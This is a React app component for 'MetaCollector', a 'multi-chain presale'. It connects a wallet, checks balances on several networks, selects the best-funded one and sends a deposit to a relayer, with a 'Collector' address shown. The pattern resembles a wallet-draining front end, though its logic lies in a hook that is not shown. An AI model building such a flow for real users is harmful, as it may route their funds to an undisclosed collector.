import React from 'react'
import { useAppKit } from '@reown/appkit/react'
import { useMetaCollector } from './hooks/useMetaCollector'
import './App.css'

function App() {
  const { open } = useAppKit()
  const {
    address,
    isConnected,
    loading,
    balanceResults,
    eligibleNetworks,
    bestNetwork,
    depositAmount,
    setDepositAmount,
    transactionStatus,
    checkBalances,
    executeDeposit
  } = useMetaCollector()

  return (
    <div className="app">
      <div className="container">
        <header className="header">
          <h1>🔮 MetaCollector</h1>
          <p>Multi-Chain Presale with Relayer</p>
          <div className="contract-badge">
            <span>Contract: 0x377a...7bd8</span>
            <span>Collector: 0xde6b...e1824</span>
          </div>
        </header>

        <main className="main">
          {/* Wallet Connection */}
          <div className="card wallet-card">
            <h2>🔌 Wallet Connection</h2>
            {!isConnected ? (
              <button 
                onClick={() => open()} 
                className="button button-primary button-large"
              >
                Connect Wallet
              </button>
            ) : (
              <div className="wallet-info">
                <div className="address-container">
                  <span className="address-label">Connected:</span>
                  <span className="address">
                    {address?.slice(0, 6)}...{address?.slice(-4)}
                  </span>
                </div>
                <button 
                  onClick={() => open()} 
                  className="button button-secondary"
                >
                  Switch
                </button>
              </div>
            )}
          </div>

          {/* Balance Check Button */}
          {isConnected && (
            <div className="card eligibility-card">
              <h2>💰 Check Balances</h2>
              <button 
                onClick={checkBalances} 
                className="button button-primary button-large"
                disabled={loading}
              >
                {loading ? 'Checking...' : 'Check Wallet Balances'}
              </button>

              {/* Show Balance Results */}
              {balanceResults && (
                <div className="balance-results">
                  <h3>Network Balances (need ~$1 min):</h3>
                  <div className="networks-grid">
                    {Object.values(balanceResults).map((network) => (
                      <div 
                        key={network.network}
                        className={`network-card ${network.canParticipate ? 'eligible' : ''}`}
                      >
                        <div className="network-header">
                          <span className="network-name">{network.networkName}</span>
                          {network.canParticipate && (
                            <span className="eligible-badge">✅ Eligible</span>
                          )}
                        </div>
                        <div className="balance-display">
                          <span className="balance-value">{network.balanceFormatted}</span>
                          <span className="balance-currency">{network.currency}</span>
                        </div>
                        <div className="threshold-info">
                          Need: {network.minRequired} {network.currency}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Show Eligible Networks */}
              {eligibleNetworks.length > 0 && (
                <div className="eligible-networks">
                  <h3>✅ Networks with sufficient funds:</h3>
                  <div className="networks-list">
                    {eligibleNetworks.map((network) => (
                      <div 
                        key={network.network}
                        className={`network-item ${bestNetwork?.network === network.network ? 'best' : ''}`}
                      >
                        <div className="network-header">
                          <span className="network-badge">{network.networkName}</span>
                          {bestNetwork?.network === network.network && (
                            <span className="best-badge">Best Network</span>
                          )}
                        </div>
                        <div className="network-details">
                          <div className="detail-row">
                            <span>Balance:</span>
                            <strong>{network.balanceFormatted} {network.currency}</strong>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>

                  {/* Deposit Form */}
                  {bestNetwork && (
                    <div className="deposit-form">
                      <h3>Make Deposit on {bestNetwork.networkName}</h3>
                      <div className="best-network-info">
                        <p>Your Balance: <strong>{bestNetwork.balanceFormatted} {bestNetwork.currency}</strong></p>
                        <p className="hint">Enter amount to deposit (will be sent to relayer)</p>
                      </div>
                      
                      <div className="input-group">
                        <input
                          type="number"
                          placeholder={`Amount in ${bestNetwork.currency}`}
                          value={depositAmount}
                          onChange={(e) => setDepositAmount(e.target.value)}
                          min="0.001"
                          max={bestNetwork.balance}
                          step="0.001"
                          className="input"
                        />
                        <span className="input-currency">{bestNetwork.currency}</span>
                      </div>
                      
                      <button
                        onClick={executeDeposit}
                        disabled={loading || !depositAmount}
                        className="button button-primary button-large"
                      >
                        {loading ? 'Processing...' : 'Deposit via Relayer'}
                      </button>
                    </div>
                  )}
                </div>
              )}

              {/* No Funds Message */}
              {eligibleNetworks.length === 0 && balanceResults && !loading && (
                <div className="no-eligibility">
                  <p>No network has sufficient balance</p>
                  <p className="hint">You need at least $1 worth of native currency for gas</p>
                </div>
              )}
            </div>
          )}

          {/* Transaction Status */}
          {transactionStatus && (
            <div className={`card status-card ${transactionStatus.type}`}>
              <div className="status-header">
                {transactionStatus.type === 'pending' && '⏳'}
                {transactionStatus.type === 'success' && '✅'}
                {transactionStatus.type === 'error' && '❌'}
                {transactionStatus.type === 'info' && 'ℹ️'}
                <h3>
                  {transactionStatus.type.charAt(0).toUpperCase() + transactionStatus.type.slice(1)}
                </h3>
              </div>
              <p className="status-message">{transactionStatus.message}</p>
              {transactionStatus.hash && (
                <a 
                  href={`https://etherscan.io/tx/${transactionStatus.hash}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="tx-link"
                >
                  View Transaction ↗
                </a>
              )}
            </div>
          )}
        </main>

        <footer className="footer">
          <p>MetaCollector • $1 Minimum Balance Required</p>
        </footer>
      </div>
    </div>
  )
}

export default App
